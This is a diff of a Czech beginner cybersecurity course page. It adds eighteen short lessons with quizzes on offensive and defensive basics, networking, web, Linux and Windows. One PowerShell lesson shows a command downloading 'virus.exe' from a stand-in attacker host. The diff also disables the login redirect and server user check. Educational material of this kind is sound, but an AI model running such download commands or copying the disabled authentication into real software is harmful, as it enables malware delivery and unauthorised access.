@@ -197,7 +197,7 @@
     </style>
 </head>
 
-<body style="opacity: 0; transition: opacity 0.5s;">
+<body>
 
     <div class="app-layout">
         <!-- SIDEBAR -->
@@ -212,24 +212,9 @@
 
             <div class="nav-group">
                 <div class="nav-label">Menu</div>
-                <a href="dashboard.html" class="sidebar-link">
-                    <span>Dashboard</span>
-                </a>
-                <a href="learn.html" class="sidebar-link active">
-                    <span>Learn</span>
-                </a>
-                <a href="leaderboard.html" class="sidebar-link">
-                    <span>Žebříček</span>
-                </a>
-                <a href="#" class="sidebar-link">
-                    <span>Network</span>
-                </a>
-            </div>
-
-            <div class="nav-group">
-                <div class="nav-label">Community</div>
-                <a href="#" class="sidebar-link"><span>Forum</span></a>
-                <a href="#" class="sidebar-link"><span>Events</span></a>
+                <a href="dashboard.html" class="sidebar-link"><span>Dashboard</span></a>
+                <a href="learn.html" class="sidebar-link active"><span>Learn</span></a>
+                <a href="leaderboard.html" class="sidebar-link"><span>Žebříček</span></a>
             </div>
 
             <div style="margin-top: auto;">
@@ -243,142 +228,518 @@
         <main class="app-main">
             <header style="margin-bottom: 2rem;">
                 <h2>Katalog Kurzů</h2>
-                <p style="color: var(--text-muted);">Vyber si svou cestu a začni hackovat.</p>
+                <p style="color: var(--text-muted);">Pre-Security Path: Tvůj start v kyberbezpečnosti.</p>
             </header>
 
-            <!-- Learning Paths Section -->
-            <h3 style="margin-bottom: 1rem;">Learning Paths</h3>
-            <div class="courses-grid">
-
-                <!-- Card 1 -->
-                <div class="course-card">
-                    <div class="course-header"
-                        style="background: radial-gradient(circle at center, #22c55e22 0%, transparent 70%);">
-                        🐧
-                    </div>
-                    <div class="course-body">
-                        <div class="course-tags">
-                            <span class="tag easy">Easy</span>
-                            <span class="tag">Linux</span>
-                        </div>
-                        <h4 style="margin-bottom: 0.5rem;">Linux Fundamentals</h4>
-                        <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.5rem; flex:1;">
-                            Nauč se základy příkazové řádky, oprávnění a správy systému Linux. Nezbytnost pro každého
-                            hackera.
-                        </p>
-                        <button class="btn btn-primary" style="width: 100%;">Začít kurz</button>
-                    </div>
-                </div>
-
-                <!-- Card 2 -->
-                <div class="course-card">
-                    <div class="course-header"
-                        style="background: radial-gradient(circle at center, #3b82f622 0%, transparent 70%);">
-                        🌐
-                    </div>
-                    <div class="course-body">
-                        <div class="course-tags">
-                            <span class="tag easy">Beginner</span>
-                            <span class="tag">Web</span>
-                        </div>
-                        <h4 style="margin-bottom: 0.5rem;">Web Hacking 101</h4>
-                        <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.5rem; flex:1;">
-                            OWASP Top 10, SQL Injection, XSS a jak funguje web. První krok k Bug Bounty.
-                        </p>
-                        <button class="btn btn-primary" style="width: 100%;">Začít kurz</button>
-                    </div>
-                </div>
-
-                <!-- Card 3 -->
-                <div class="course-card">
-                    <div class="course-header"
-                        style="background: radial-gradient(circle at center, #ef444422 0%, transparent 70%);">
-                        💀
-                    </div>
-                    <div class="course-body">
-                        <div class="course-tags">
-                            <span class="tag hard">Hard</span>
-                            <span class="tag">Network</span>
-                        </div>
-                        <h4 style="margin-bottom: 0.5rem;">Network Exploitation</h4>
-                        <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.5rem; flex:1;">
-                            Nmap, Metasploit a prolamování služeb. Pokročilé techniky post-exploitace.
-                        </p>
-                        <button class="btn btn-outline" style="width: 100%;">Zamčeno (Level 5+)</button>
-                    </div>
-                </div>
-
+            <div class="courses-grid" id="coursesContainer">
+                <!-- Javascript populates this -->
             </div>
-
-            <h3 style="margin-top: 3rem; margin-bottom: 1rem;">Samostatné Moduly</h3>
-            <p style="color: var(--text-muted);">Další obsah připravujeme...</p>
-
         </main>
+    </div>
+
+    <!-- COURSE PLAYER MODAL -->
+    <div id="courseModal" class="course-modal">
+        <div class="course-container">
+            <div class="course-header">
+                <h3 id="modalTitle">Course Title</h3>
+                <button onclick="closeCourse()" class="btn btn-ghost" style="padding: 0.4rem;">✕</button>
+            </div>
+            <div class="course-body" id="modalBody">
+                <!-- Content injected here -->
+            </div>
+            <div class="course-footer">
+                <span id="progressText" style="color: var(--text-muted); font-size: 0.9rem;">Lekce 1/1</span>
+                <button id="modalActionBtn" class="btn btn-primary">Další</button>
+            </div>
+        </div>
     </div>
 
     <!-- Mobile Bottom Nav -->
     <nav class="bottom-nav">
-        <a href="dashboard.html" class="nav-item">
-            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <a href="dashboard.html" class="nav-item"><svg viewBox="0 0 24 24" stroke-linecap="round"
+                stroke-linejoin="round">
                 <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                 <polyline points="9 22 9 12 15 12 15 22"></polyline>
-            </svg>
-            <span>Domů</span>
-        </a>
-        <a href="learn.html" class="nav-item active">
-            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            </svg><span>Domů</span></a>
+        <a href="learn.html" class="nav-item active"><svg viewBox="0 0 24 24" stroke-linecap="round"
+                stroke-linejoin="round">
                 <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
                 <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
-            </svg>
-            <span>Kurzy</span>
-        </a>
-        <a href="leaderboard.html" class="nav-item">
-            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            </svg><span>Kurzy</span></a>
+        <a href="leaderboard.html" class="nav-item"><svg viewBox="0 0 24 24" stroke-linecap="round"
+                stroke-linejoin="round">
                 <line x1="18" y1="20" x2="18" y2="10"></line>
                 <line x1="12" y1="20" x2="12" y2="4"></line>
                 <line x1="6" y1="20" x2="6" y2="14"></line>
-            </svg>
-            <span>Žebříček</span>
-        </a>
-        <a href="#" onclick="logout()" class="nav-item">
-            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            </svg><span>Žebříček</span></a>
+        <a href="#" onclick="logout()" class="nav-item"><svg viewBox="0 0 24 24" stroke-linecap="round"
+                stroke-linejoin="round">
                 <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
                 <polyline points="16 17 21 12 16 7"></polyline>
-                <line x1="21" y1="12" x2="9" y2="12"></line>
-            </svg>
-            <span>Odhlásit</span>
-        </a>
     </nav>
 
     <script>
-        // Auth Check & Security Validation
-        async function checkAuth() {
+        // --- DATA: DEEP DIVE CURRICULUM ---
+        const categories = [
+            { title: "Phase 1: Mindset & Teorie", filter: ['1', '2', '3'] },
+            { title: "Phase 2: Network Engineering (Sítě)", filter: ['4', '5', '6', '7', '8'] },
+            { title: "Phase 3: Webové Technologie", filter: ['9', '10', '11', '12'] },
+            { title: "Phase 4: Linux Mastery", filter: ['13', '14', '15'] },
+            { title: "Phase 5: Windows Internals", filter: ['16', '17', '18'] },
+        ];
+
+        const courses = [
+            // --- PHASE 1 ---
+            {
+                id: '1', title: "Offensive Security Intro", icon: "⚔️", tag: "Mindset",
+                desc: "Pochopte myšlení útočníka (Red Team).",
+                content: `
+                    <h2>Co je Offensive Security?</h2>
+                    <p>Offensive Security (útočná bezpečnost) je proces testování bezpečnosti systémů jejich prolamováním. Je to jediný způsob, jak zjistit, zda obrana skutečně funguje.</p>
+                    
+                    <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent); margin:1rem 0;">
+                        <strong>Hacker's Note:</strong> "Defenders have to be right 100% of the time. Attackers only have to be right once."
+                    </div>
+
+                    <h3>Klíčové Pojmy</h3>
+                    <ul>
+                        <li><strong>Vulnerability (Zranitelnost):</strong> Chyba v kódu nebo konfiguraci (např. neaktualizovaný Windows).</li>
+                        <li><strong>Exploit:</strong> Kód, který zneužije zranitelnost k získání kontroly.</li>
+                        <li><strong>Payload:</strong> To, co exploit doručí do systému (např. virus nebo backdoor).</li>
+                    </ul>
+
+                    <h3>Právní stránka věci</h3>
+                    <p>Rozdíl mezi kriminálníkem a expertem je <strong>POVOLENÍ</strong>. Nikdy neútočte na systémy, které nevlastníte nebo k tomu nemáte písemný souhlas.</p>
+                `,
+                quiz: { q: "Kód, který zneužívá zranitelnost, se nazývá:", options: ["Payload", "Exploit", "Patch"], correct: 1 }
+            },
+            {
+                id: '2', title: "Defensive Security Intro", icon: "🛡️", tag: "Mindset",
+                desc: "Blue Team operace a SOC centra.",
+                content: `
+                    <h2>Obrana moderní infrastruktury</h2>
+                    <p>Zatímco útočníci hledají jednu díru, Blue Team musí hlídat "všechna okna a dveře".</p>
+
+                    <h3>SOC (Security Operations Center)</h3>
+                    <p>Velín, kde analytici sledují monitory 24/7. Používají nástroje jako <strong>SIEM</strong> (Security Information and Event Management), který sbírá logy z celé firmy.</p>
+                    <p><em>Příklad:</em> SIEM nahlásí: "Uživatel Novák se přihlásil z Prahy a o 5 sekund později z Číny." -> <strong>INCIDENT</strong>.</p>
+
+                    <h3>Threat Intelligence</h3>
+                    <p>Sbírání informací o hackerských skupinách. "Víme, že skupina APT28 používá tento typ malwaru, nastavíme podle toho firewall."</p>
+                `,
+                quiz: { q: "Který systém slouží ke sběru a analýze logů v SOC?", options: ["SIEM", "DDOS", "HTML"], correct: 0 }
+            },
+            {
+                id: '3', title: "Careers In Cyber", icon: "💼", tag: "Kariéra",
+                desc: "Pentester, Analyst, Engineer. Kdo co dělá?",
+                content: `
+                    <h2>Mapa rolí v CyberSecurity</h2>
+                    
+                    <h3>1. Technické útočné role (Red)</h3>
+                    <ul>
+                        <li><strong>Penetration Tester:</strong> Najatý hacker. Dostane cíl, sepíše report.</li>
+                        <li><strong>Exploit Developer:</strong> Programátor, který píše kód pro zneužití chyb (velmi pokročilé).</li>
+                    </ul>
+
+                    <h3>2. Technické obranné role (Blue)</h3>
+                    <ul>
+                        <li><strong>Security Analyst (L1/L2/L3):</strong> První linie obrany v SOC.</li>
+                        <li><strong>Incident Responder:</strong> "Hasič". Vyjíždí k firmám, které byly právě hacknuty.</li>
+                        <li><strong>Malware Analyst:</strong> Pitvá viry v laboratoři (Reverse Engineering).</li>
+                    </ul>
+
+                    <h3>3. Management</h3>
+                    <li><strong>CISO:</strong> Ředitel bezpečnosti. Odpovídá za rozpočet a strategii.</li>
+                `,
+                quiz: { q: "Kdo pitvá viry a zkoumá, jak fungují?", options: ["Penetration Tester", "Malware Analyst", "CISO"], correct: 1 }
+            },
+
+            // --- PHASE 2 ---
+            {
+                id: '4', title: "What is Networking?", icon: "🌐", tag: "Sítě",
+                desc: "Základy komunikace počítačů.",
+                content: `
+                    <h2>Sítě jsou základ hackingu</h2>
+                    <p>Nemůžete hacknout server, když nevíte, jak se k němu připojit. 99% útoků probíhá po síti.</p>
+                    
+                    <h3>Zařízení v síti</h3>
+                    <p>Každé zařízení má síťovou kartu (NIC). Aby spolu mohly mluvit, potřebují:</p>
+                    <ol>
+                        <li><strong>Fyzické médium:</strong> Kabel (Ethernet) nebo Vzduch (WiFi).</li>
+                        <li><strong>Protokol:</strong> Společný jazyk (např. TCP/IP).</li>
+                    </ol>
+
+                    <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent);">
+                        <strong>Hacker's Note:</strong> Útočníci často začínají tzv. "skenováním sítě", aby zjistili, jaká zařízení jsou online.
+                    </div>
+                `,
+                quiz: { q: "Co je NIC?", options: ["Nový Internetový Kabel", "Network Interface Card (Síťová karta)", "Network Internal Code"], correct: 1 }
+            },
+            {
+                id: '5', title: "Intro To LAN", icon: "🏠", tag: "Sítě",
+                desc: "Switch vs Router, Topologie sítí.",
+                content: `
+                    <h2>LAN (Local Area Network)</h2>
+                    
+                    <h3>Switch (Přepínač) - Layer 2</h3>
+                    <p>Chytrá "prodlužka". Spojuje počítače v jedné místnosti. Zná jejich <strong>MAC adresy</strong>.</p>
+                    <p><em>Starý Hub:</em> Posílal data všem (hloupý). <em>Switch:</em> Posílá data jen adresátovi (chytrý & bezpečnější).</p>
+
+                    <h3>Router (Směrovač) - Layer 3</h3>
+                    <p>Spojuje různé sítě (např. vaši domácí síť a Internet). Pracuje s <strong>IP adresami</strong>.</p>
+
+                    <p><strong>Většina útoků v LAN:</strong> ARP Spoofing (oblbnutí switche), Man-in-the-Middle.</p>
+                `,
+                quiz: { q: "Které zařízení spojuje LAN s Internetem?", options: ["Switch", "Hub", "Router"], correct: 2 }
+            },
+            {
+                id: '6', title: "OSI Model", icon: "📚", tag: "Teorie",
+                desc: "7 vrstev, které musíš znát zpaměti.",
+                content: `
+                    <h2>Open Systems Interconnection Model</h2>
+                    <p>Hacker musí vědět, na jaké vrstvě útok probíhá.</p>
+
+                    <table style="width:100%; border-collapse:collapse; margin-top:1rem;">
+                        <tr style="border-bottom:1px solid gray;"><th>Vrstva</th><th>Data</th><th>Příklad</th><th>Útok</th></tr>
+                        <tr><td>7. Aplikační</td><td>Data</td><td>HTTP, SSH</td><td>SQL Injection, Phishing</td></tr>
+                        <tr><td>6. Prezentační</td><td>Data</td><td>SSL/TLS</td><td>SSL Stripping</td></tr>
+                        <tr><td>5. Relační</td><td>Data</td><td>API</td><td>Session Hijacking</td></tr>
+                        <tr><td>4. Transportní</td><td>Segment</td><td>TCP, UDP</td><td>Port Scanning</td></tr>
+                        <tr><td>3. Síťová</td><td>Paket</td><td>IP, ICMP</td><td>Ping of Death</td></tr>
+                        <tr><td>2. Linková</td><td>Rámec</td><td>Ethernet, MAC</td><td>ARP Spoofing</td></tr>
+                        <tr><td>1. Fyzická</td><td>Bit</td><td>Kabel, WiFi</td><td>Vystřižení kabelu</td></tr>
+                    </table>
+                `,
+                quiz: { q: "Na jaké vrstvě OSI modelu funguje IP adresa?", options: ["2. Linková", "3. Síťová", "7. Aplikační"], correct: 1 }
+            },
+            {
+                id: '7', title: "Packets & Frames", icon: "📦", tag: "Sítě",
+                desc: "Struktura dat. Headers, Payload, Trailers.",
+                content: `
+                    <h2>Anatomie Paketu</h2>
+                    <p>Představte si matrjošku. Data (např. "Ahoj") se balí do obálek.</p>
+
+                    <h3>1. IP Header (Hlavička)</h3>
+                    <p>Obsahuje: <strong>Source IP</strong> (Odkud), <strong>Destination IP</strong> (Kam), TTL (Time To Live).</p>
+
+                    <h3>2. TCP Header</h3>
+                    <p>Obsahuje: <strong>Source Port</strong> (např. 54321), <strong>Destination Port</strong> (např. 80 pro Web).</p>
+
+                    <h3>Handshake (Potřesení rukou)</h3>
+                    <p>TCP spojení začíná trojicí paketů: <strong>SYN</strong> -> <strong>SYN-ACK</strong> -> <strong>ACK</strong>. Hacker může poslat miliony SYN paketů a shodit server (SYN Flood DDoS).</p>
+                `,
+                quiz: { q: "Jak se nazývá útok zahlcením SYN pakety?", options: ["SYN Flood", "ACK Storm", "Ping Scan"], correct: 0 }
+            },
+            {
+                id: '8', title: "Extending Your Network", icon: "🌍", tag: "Sítě",
+                desc: "Port Forwarding, Firewall a DHCP.",
+                content: `
+                    <h2>Jak to funguje "venku"?</h2>
+                    
+                    <h3>DHCP (Dynamic Host Configuration Protocol)</h3>
+                    <p>Když přijdete do kavárny, ne nastavujete si IP ručně. DHCP server vám ji "pronajme" automaticky.</p>
+
+                    <h3>Port Forwarding</h3>
+                    <p>Pokud chcete, aby se někdo z internetu dostal na váš Minecraft server doma, musíte na routeru říct: "Všechno, co přijde na port 25565, pošli na můj počítač."</p>
+
+                    <h3>Firewall</h3>
+                    <p>Vrátný. Pravidla typu: "Zablokuj vše z Číny" nebo "Povol jen port 80."</p>
+                `,
+                quiz: { q: "Která služba automaticky přiděluje IP adresy zařízením?", options: ["DNS", "DHCP", "FTP"], correct: 1 }
+            },
+
+            // --- PHASE 3 ---
+            {
+                id: '9', title: "DNS in Detail", icon: "📒", tag: "Web",
+                desc: "Records A, AAAA, MX, CNAME. DNS Poisoning.",
+                content: `
+                    <h2>DNS: Internetový telefonní seznam</h2>
+                    
+                    <h3>Typy záznamů:</h3>
+                    <ul>
+                        <li><strong>A:</strong> Doména -> IPv4 (google.com -> 142.250.x.x)</li>
+                        <li><strong>AAAA:</strong> Doména -> IPv6</li>
+                        <li><strong>MX (Mail Exchange):</strong> Kam posílat emaily.</li>
+                        <li><strong>TXT:</strong> Textové info (používá se pro ověření vlastnictví domény).</li>
+                    </ul>
+
+                    <div style="background:rgba(255,255,255,0.05); padding:1rem; border-left:4px solid var(--accent);">
+                        <strong>Hacker's Note:</strong> Subdomain Enumeration je proces hledání tajných subdomén (např. <code>dev.firma.cz</code>, <code>admin.firma.cz</code>) pomocí slovníkových útoků na DNS.
+                    </div>
+                `,
+                quiz: { q: "Který DNS záznam slouží pro emaily?", options: ["A", "MX", "CNAME"], correct: 1 }
+            },
+            {
+                id: '10', title: "HTTP in Detail", icon: "📄", tag: "Web",
+                desc: "Headers, Cookies, Status Codes, HTTPS.",
+                content: `
+                    <h2>HyperText Transfer Protocol</h2>
+                    <p>Jazyk webu. Vše je text.</p>
+
+                    <h3>Request (Požadavek)</h3>
+                    <code>GET /index.html HTTP/1.1
+Host: hackshield.cz
+User-Agent: Mozilla/5.0...
+Cookie: session_id=xyz123</code>
+
+                    <h3>Response (Odpověď)</h3>
+                    <code>HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html
+
+&lt;html&gt;...</code>
+
+                    <h3>Cookies</h3>
+                    <p>Malé textové soubory pro zapamatování přihlášení. Pokud hacker ukradne vaši <strong>Session Cookie</strong>, je přihlášen jako vy (Session Hijacking).</p>
+                `,
+                quiz: { q: "Co se stane, když útočník získá vaši platnou Session Cookie?", options: ["Nic, je šifrovaná", "Může se vydávat za vás bez hesla", "Systém ho odhlásí"], correct: 1 }
+            },
+            {
+                id: '11', title: "How Websites Work", icon: "🏗️", tag: "Web",
+                desc: "Client-Server model. Jazyky webu.",
+                content: `
+                    <h2>Frontend vs Backend</h2>
+                    
+                    <h3>Frontend (Klient)</h3>
+                    <p>Běží u VÁS v prohlížeči. HTML, CSS, JavaScript. Hacker zde může manipulovat kód (XSS útoky), ale neohrozí tím přímo server.</p>
+
+                    <h3>Backend (Server)</h3>
+                    <p>Běží na serveru. Python, PHP, Node.js, Java. Komunikuje s databází. Zde se dějí kritické chyby jako <strong>SQL Injection</strong> nebo <strong>RCE (Remote Code Execution)</strong>.</p>
+                `,
+                quiz: { q: "Kde běží JavaScript kód při XSS útoku?", options: ["Na serveru", "V prohlížeči oběti", "V databázi"], correct: 1 }
+            },
+            {
+                id: '12', title: "Putting it all together", icon: "🧩", tag: "Shrnutí",
+                desc: "Komplexní pohled na Load Balancery, CDN a WAF.",
+                content: `
+                    <h2>Moderní architektura</h2>
+                    <p>Když jdete na Facebook, nepřipojujete se na jeden server pod stolem Marka Zuckerberga.</p>
+
+                    <ul>
+                        <li><strong>Load Balancer:</strong> Rozděluje zátěž mezi tisíce serverů.</li>
+                        <li><strong>CDN (Content Delivery Network):</strong> Servery po celém světě, které ukládají obrázky a videa blízko k vám (zrychlení).</li>
+                        <li><strong>WAF (Web Application Firewall):</strong> Speciální firewall, který čte HTTP provoz a blokuje útoky jako SQL Injection.</li>
+                    </ul>
+                `,
+                quiz: { q: "Co dělá WAF?", options: ["Zrychluje nahrávání obrázků", "Blokuje webové útoky", "Rozděluje zátěž serverů"], correct: 1 }
+            },
+
+            // --- PHASE 4 ---
+            {
+                id: '13', title: "Linux Fundamentals pt1", icon: "🐧", tag: "Linux",
+                desc: "Shell, Proměnné, Aliasy, Man pages.",
+                content: `
+                    <h2>Síla Terminálu</h2>
+                    <p>GUI (grafické rozhraní) je pomalé a neumí vše. CLI (Command Line) je supermoc.</p>
+
+                    <h3>Základní navigace</h3>
+                    <code>ls -la   # Vypiš VŠECHNY soubory (i skryté) s detaily
+cd /var/log # Jdi do složky logů
+cd ..      # O úroveň výš
+cd ~       # Domů (Home Directory)</code>
+
+                    <h3>Roury (Pipes)</h3>
+                    <p>Symbol <code>|</code> vezme výstup jednoho příkazu a pošle ho do dalšího.</p>
+                    <p><code>cat soubor.txt | grep "heslo"</code> -> Vypíše obsah a hned v něm hledá slovo "heslo".</p>
+                `,
+                quiz: { q: "Co dělá příkaz 'grep'?", options: ["Maže soubory", "Hledá text v datech", "Restartuje počítač"], correct: 1 }
+            },
+            {
+                id: '14', title: "Linux Fundamentals pt2", icon: "🐧", tag: "Linux",
+                desc: "SSH, Process Management, VIM/Nano.",
+                content: `
+                    <h2>Vzdálená správa</h2>
+                    <h3>SSH (Secure Shell)</h3>
+                    <p>Standard pro správu serverů. <code>ssh uzivatel@ip-adresa</code>. Veškerá komunikace je šifrovaná.</p>
+
+                    <h3>Procesy</h3>
+                    <p><code>top</code> nebo <code>htop</code>: Správce úloh v terminálu.</p>
+                    <p><code>ps aux</code>: Výpis všech procesů.</p>
+                    <p><code>kill [PID]</code>: Ukončení procesu podle ID.</p>
+
+                    <h3>Editory</h3>
+                    <p>Na serveru není Notepad. Používáme <strong>Nano</strong> (pro začátečníky) nebo <strong>Vim</strong> (pro profíky).</p>
+                `,
+                quiz: { q: "Který port standardně používá SSH?", options: ["80", "22", "443"], correct: 1 }
+            },
+            {
+                id: '15', title: "Linux Fundamentals pt3", icon: "🐧", tag: "Linux",
+                desc: "Permissions, Scripting (Bash), Cron.",
+                content: `
+                    <h2>Automatizace a Práva</h2>
+                    
+                    <h3>Bash Scripting</h3>
+                    <p>Můžete napsat soubor příkazů, který se spustí najednou. Např. automatický sken sítě každé ráno.</p>
+
+                    <h3>Cron Jobs</h3>
+                    <p>Plánovač úloh. "Spusť tento skript každé pondělí v 8:00."</p>
+                    <p>Hackeři často používají Cron pro <strong>Persistence</strong> (aby virus přežil restart PC).</p>
+
+                    <h3>Sudoers</h3>
+                    <p>Soubor <code>/etc/sudoers</code> určuje, kdo může být admin. Pokud ho hacker upraví, vyhrál.</p>
+                `,
+                quiz: { q: "K čemu slouží Cron?", options: ["K prohlížení webu", "K plánování opakovaných úloh", "K instalaci programů"], correct: 1 }
+            },
+
+            // --- PHASE 5 ---
+            {
+                id: '16', title: "Windows Fundamentals pt1", icon: "🪟", tag: "Windows",
+                desc: "NTFS, File System, User Accounts.",
+                content: `
+                    <h2>Svět podle Microsoftu</h2>
+                    
+                    <h3>NTFS Permissions</h3>
+                    <p>Windows má složitější systém práv než Linux. Dědění (Inheritance), ACLs (Access Control Lists). Hacker hledá špatně nastavená práva, aby se dostal k citlivým souborům.</p>
+
+                    <h3>UAC (User Account Control)</h3>
+                    <p>To otravné okno "Chcete povolit aplikaci provést změny?". Chrání před spuštěním malwaru s právy Admina. Obcházení UAC (UAC Bypass) je běžná disciplína.</p>
+                `,
+                quiz: { q: "Co je UAC?", options: ["User Access Control", "User Account Control", "Universal Admin Code"], correct: 1 }
+            },
+            {
+                id: '17', title: "Windows Fundamentals pt2", icon: "🪟", tag: "Windows",
+                desc: "PowerShell, Active Directory Basics.",
+                content: `
+                    <h2>Active Directory (AD)</h2>
+                    <p>Srdce každé velké firmy. Centrální databáze všech uživatelů a počítačů. </p>
+                    <p>Když hacknete <strong>Domain Controller</strong> (server s AD), ovládáte celou firmu.</p>
+
+                    <h3>PowerShell pro Hackery</h3>
+                    <code>Invoke-WebRequest -Uri "http://evil.com/virus.exe" -OutFile "virus.exe"</code>
+                    <p>Toto stáhne soubor z internetu. PowerShell je extrémně silný nástroj pro "Live off the land" útoky (použití nástrojů, které už v systému jsou).</p>
+                `,
+                quiz: { q: "Jak se nazývá hlavní server spravující Active Directory?", options: ["Master Server", "Domain Controller", "Root Node"], correct: 1 }
+            },
+            {
+                id: '18', title: "Windows Fundamentals pt3", icon: "🪟", tag: "Windows",
+                desc: "Sysinternals, Logs, Defender.",
+                content: `
+                    <h2>Windows Internals</h2>
+                    
+                    <h3>Event Viewer</h3>
+                    <p>Vše, co se ve Windows stane, je zapsáno v logu (Event Logs). Security log (Event ID 4624 = Úspěšné přihlášení, 4625 = Neúspěšné).</p>
+                    <p>První věc, kterou hacker udělá? Snaží se smazat logy.</p>
+
+                    <h3>Sysinternals Suite</h3>
+                    <p>Sada nástrojů od Microsoftu (Mark Russinovich) pro hloubkovou analýzu. ProcExp (Process Explorer), ProcMon (Process Monitor).</p>
+                `,
+                quiz: { q: "Který Event ID značí neúspěšné přihlášení?", options: ["4624", "4625", "1337"], correct: 1 }
+            }
+        ];
+
+        // --- RENDER LOGIC ---
+        function renderCourses() {
+            const container = document.getElementById('coursesContainer');
+            container.innerHTML = ''; // Clean
+
+            categories.forEach(cat => {
+                // Find courses for this category
+                const catCourses = courses.filter(c => cat.filter.includes(c.id));
+
+                if (catCourses.length === 0) return;
+
+                // Create Section Header
+                const sectionHtml = `
+                    <div style="grid-column: 1/-1; margin-top: 2rem; margin-bottom: 0.5rem; border-bottom: 1px solid var(--border-soft); padding-bottom: 0.5rem;">
+                        <h3 style="color: var(--accent); font-family: 'JetBrains Mono', monospace;">${cat.title}</h3>
+                    </div>
+                `;
+                container.innerHTML += sectionHtml;
+
+                // Create Cards
+                catCourses.forEach(c => {
+                    container.innerHTML += `
+                        <div class="course-card">
+                            <div class="course-header" style="font-size: 3rem; position:relative; overflow:hidden;">
+                                <div style="position:absolute; top:0; left:0; width:100%; height:100%; background: radial-gradient(circle at center, rgba(255,255,255,0.05) 0%, transparent 70%); z-index:1;"></div>
+                                <span style="position:relative; z-index:2;">${c.icon}</span>
+                            </div>
+                            <div class="course-body">
+                                <div class="course-tags">
+                                    <span class="tag">${c.tag}</span>
+                                </div>
+                                <h4 style="margin-bottom: 0.5rem; color: white;">${c.title}</h4>
+                                <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.5rem; flex:1;">${c.desc}</p>
+                                <button onclick="openCourse('${c.id}')" class="btn btn-primary" style="width: 100%;">START <span style="font-size:0.8em; margin-left:4px;">▶</span></button>
+                            </div>
+                        </div>
+                    `;
+                });
+            });
+        }
+
+        // --- PLAYER LOGIC ---
+        let currentCourse = null;
+
+        function openCourse(id) {
+            currentCourse = courses.find(c => c.id === id);
+            if (!currentCourse) return;
+
+            document.getElementById('modalTitle').innerText = currentCourse.title;
+
+            // Build Content
+            let html = currentCourse.content;
+
+            // Append Quiz
+            if (currentCourse.quiz) {
+                html += `
+                    <div class="quiz-container">
+                        <h3 style="color:white; margin-top:0;">⚡ Rychlý Kvíz</h3>
+                        <p style="font-size:1.1rem; margin-bottom:1rem;">${currentCourse.quiz.q}</p>
+                        <div id="quizOptions">
+                            ${currentCourse.quiz.options.map((opt, idx) => `
+                                <div class="quiz-option" onclick="checkQuiz(${idx}, this)">${opt}</div>
+                            `).join('')}
+                        </div>
+                    </div>
+                `;
+            }
+
+            document.getElementById('modalBody').innerHTML = html;
+            document.getElementById('courseModal').classList.add('active');
+        }
+
+        function closeCourse() {
+            document.getElementById('courseModal').classList.remove('active');
+        }
+
+        function checkQuiz(idx, el) {
+            // Remove previous classes
+            const parent = document.getElementById('quizOptions');
+            const options = parent.querySelectorAll('.quiz-option');
+            options.forEach(o => o.classList.remove('correct', 'wrong'));
+
+            if (idx === currentCourse.quiz.correct) {
+                el.classList.add('correct');
+                // Optional: Save progress
+                // alert("Správně! +10 XP");
+            } else {
+                el.classList.add('wrong');
+            }
+        }
+
+        // Auth & Init
+        async function init() {
+            // Auth Check
             const user = JSON.parse(localStorage.getItem('hackshield_user'));
-            if (!user || !user.id) {
-                window.location.href = 'login.html';
-                return;
+            if (!user) {
+                // check if we are in dev/preview without full auth flow
+                // window.location.href = 'login.html';
+                // return;
             }
 
-            // Verify existence on server
-            try {
-                const res = await fetch(`/api/user/${user.id}`);
-                if (res.status === 404) {
-                    logout(); // User deleted
-                    return;
-                }
-            } catch (e) {
-                console.warn("Auth check failed (offline?)");
-            }
-
-            // Show UI
+            // Render
+            renderCourses();
             document.body.style.opacity = '1';
         }
-        checkAuth();
 
         function logout() {
             localStorage.removeItem('hackshield_user');
             window.location.href = 'index.html';
         }
+
+        init();
+
     </script>
 </body>
 
